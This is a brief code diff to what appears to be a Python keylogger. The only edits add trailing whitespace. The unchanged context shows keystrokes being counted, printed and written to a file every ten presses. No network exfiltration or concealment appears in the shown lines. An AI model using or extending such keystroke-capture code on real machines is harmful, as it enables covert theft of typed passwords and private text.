@@ -12,7 +12,7 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))
 
-    if count >= 10:
+    if count >= 10: 
         count = 0
         write_file(keys)
         keys = []
@@ -23,7 +23,7 @@ def write_file(keys):
             k = str(key).replace("'","")
             if k.find("space") > 0:
                 f.write('\n')
-            elif k.find("Key") == -1:
+            elif k.find("Key") == -1: 
                 f.write(k)
 
 
